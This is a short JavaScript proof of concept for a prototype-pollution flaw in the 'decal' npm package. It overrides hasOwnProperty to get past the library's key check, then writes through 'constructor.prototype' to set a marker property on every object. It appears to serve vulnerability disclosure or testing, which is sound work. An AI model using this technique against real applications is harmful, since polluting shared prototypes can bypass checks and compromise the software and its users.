Object.prototype.hasOwnProperty = () => true;
const decal = require('decal');
console.log({}.polluted);
decal.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);